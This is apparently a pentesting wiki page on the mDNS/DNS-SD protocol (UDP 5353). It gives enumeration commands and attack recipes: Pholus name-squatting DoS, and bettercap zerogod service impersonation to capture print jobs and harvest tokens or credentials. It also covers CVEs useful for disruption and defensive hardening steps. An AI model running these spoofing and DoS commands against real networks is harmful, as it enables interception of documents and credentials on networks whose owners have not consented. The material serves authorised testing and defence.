# 5353/UDP Multicast DNS (mDNS) and DNS-SD

{{#include ../banners/hacktricks-training.md}}

## Basic Information

Multicast DNS (mDNS) enables DNS-like name resolution and service discovery inside a local link without a unicast DNS server. It uses UDP/5353 and the multicast addresses 224.0.0.251 (IPv4) and FF02::FB (IPv6). DNS Service Discovery (DNS-SD, typically used with mDNS) provides a standardized way to enumerate and describe services via PTR, SRV and TXT records.

```
PORT     STATE SERVICE
5353/udp open  zeroconf
```

Key protocol details you’ll often leverage during attacks:
- Names in the .local zone are resolved via mDNS.
- QU (Query Unicast) bit may request unicast replies even for multicast questions.
- Implementations should ignore packets not sourced from the local link; some stacks still accept them.
- Probing/announcing enforces unique host/service names; interfering here creates DoS/“name squatting” conditions.

## DNS-SD service model

Services are identified as _<service>._tcp or _<service>._udp under .local, e.g. _ipp._tcp.local (printers), _airplay._tcp.local (AirPlay), _adb._tcp.local (Android Debug Bridge), etc. Discover types with _services._dns-sd._udp.local, then resolve discovered instances to SRV/TXT/A/AAAA.

## Network Exploration and Enumeration

- nmap target scan (direct mDNS on a host):
  ```bash
  nmap -sU -p 5353 --script=dns-service-discovery <target>
  ```
- nmap broadcast discovery (listen to the segment and enumerate all DNS-SD types/instances):
  ```bash
  sudo nmap --script=broadcast-dns-service-discovery
  ```
- avahi-browse (Linux):
  ```bash
  # List service types
  avahi-browse -bt _services._dns-sd._udp
  # Browse all services and resolve to host/port
  avahi-browse -art
  ```
- Apple dns-sd (macOS):
  ```bash
  # Browse all HTTP services
  dns-sd -B _http._tcp
  # Enumerate service types
  dns-sd -B _services._dns-sd._udp
  # Resolve a specific instance to SRV/TXT
  dns-sd -L "My Printer" _ipp._tcp local
  ```
- Packet capture with tshark:
  ```bash
  # Live capture
  sudo tshark -i <iface> -f "udp port 5353" -Y mdns
  # Only DNS-SD service list queries
  sudo tshark -i <iface> -f "udp port 5353" -Y "dns.qry.name == \"_services._dns-sd._udp.local\""
  ```

Tip: Some browsers/WebRTC use ephemeral mDNS hostnames to mask local IPs. If you see random-UUID.local candidates on the wire, resolve them with mDNS to pivot to local IPs.

## Attacks

### mDNS name probing interference (DoS / name squatting)

During the probing phase, a host checks name uniqueness. Responding with spoofed conflicts forces it to pick new names or fail. This can delay or prevent service registration and discovery.

Example with Pholus:
```bash
# Block new devices from taking names by auto-faking responses
sudo python3 pholus3.py <iface> -afre -stimeout 1000
```

### Service spoofing and impersonation (MitM)

Impersonate advertised DNS-SD services (printers, AirPlay, HTTP, file shares) to coerce clients into connecting to you. This is especially useful to:
- Capture documents by spoofing _ipp._tcp or _printer._tcp.
- Lure clients to HTTP/HTTPS services to harvest tokens/cookies or deliver payloads.
- Combine with NTLM relay techniques when Windows clients negotiate auth to spoofed services.

With bettercap’s zerogod module (mDNS/DNS-SD spoofer/impersonator):
```bash
# Start mDNS/DNS-SD discovery
sudo bettercap -iface <iface> -eval "zerogod.discovery on"

# Show all services seen from a host
> zerogod.show 192.168.1.42

# Impersonate all services of a target host automatically
> zerogod.impersonate 192.168.1.42

# Save IPP print jobs to disk while impersonating a printer
> set zerogod.ipp.save_path ~/.bettercap/zerogod/documents/
> zerogod.impersonate 192.168.1.42

# Replay previously captured services
> zerogod.save 192.168.1.42 target.yml
> zerogod.advertise target.yml
```

### Notes on recent implementation issues (useful for DoS/persistence during engagements)

- Avahi reachable-assertion and D-Bus crash bugs (2023) can terminate avahi-daemon on Linux distributions (e.g. CVE-2023-38469..38473, CVE-2023-1981), disrupting service discovery on target hosts until restart.
- Cisco IOS XE Wireless LAN Controller mDNS gateway DoS (2024, CVE-2024-20303) allows adjacent attackers to drive high CPU and disconnect APs. If you encounter an mDNS gateway between VLANs, be aware of its stability under malformed or high-rate mDNS.

## Defensive considerations and OPSEC

- Segment boundaries: Don’t route 224.0.0.251/FF02::FB between security zones unless an mDNS gateway is explicitly required. If you must bridge discovery, prefer allowlists and rate limits.
- Windows endpoints/servers:
  - To hard-disable name resolution via mDNS set the registry value and reboot:
    ```
    HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableMDNS = 0 (DWORD)
    ```
  - In managed environments, disable the built-in “mDNS (UDP-In)” Windows Defender Firewall rule (at least on the Domain profile) to prevent inbound mDNS processing while preserving home/roaming functionality.
  - On newer Windows 11 builds/GPO templates, use the policy “Computer Configuration > Administrative Templates > Network > DNS Client > Configure multicast DNS (mDNS) protocol” and set it to Disabled.
- Linux (Avahi):
  - Lock down publishing when not needed: set `disable-publishing=yes`, and restrict interfaces with `allow-interfaces=` / `deny-interfaces=` in `/etc/avahi/avahi-daemon.conf`.
  - Consider `check-response-ttl=yes` and avoid `enable-reflector=yes` unless strictly required; prefer `reflect-filters=` allowlists when reflecting.
- macOS: Restrict inbound mDNS at host/network firewalls when Bonjour discovery is not needed for specific subnets.
- Monitoring: Alert on unusual surges in `_services._dns-sd._udp.local` queries or sudden changes in SRV/TXT of critical services; these are indicators of spoofing or service impersonation.

## Tooling quick reference

- nmap NSE: `dns-service-discovery` and `broadcast-dns-service-discovery`.
- Pholus: active scan, reverse mDNS sweeps, DoS and spoofing helpers.
  ```bash
  # Passive sniff (timeout seconds)
  sudo python3 pholus3.py <iface> -stimeout 60
  # Enumerate service types
  sudo python3 pholus3.py <iface> -sscan
  # Send generic mDNS requests
  sudo python3 pholus3.py <iface> --request
  # Reverse mDNS sweep of a subnet
  sudo python3 pholus3.py <iface> -rdns_scanning 192.168.2.0/24
  ```
- bettercap zerogod: discover, save, advertise, and impersonate mDNS/DNS-SD services (see examples above).

## Spoofing/MitM

The most interesting attack you can perform over this service is to perform a MitM in the communication between the client and the real server. You might be able to obtain sensitive files (MitM the communication with the printer) or even credentials (Windows authentication).\
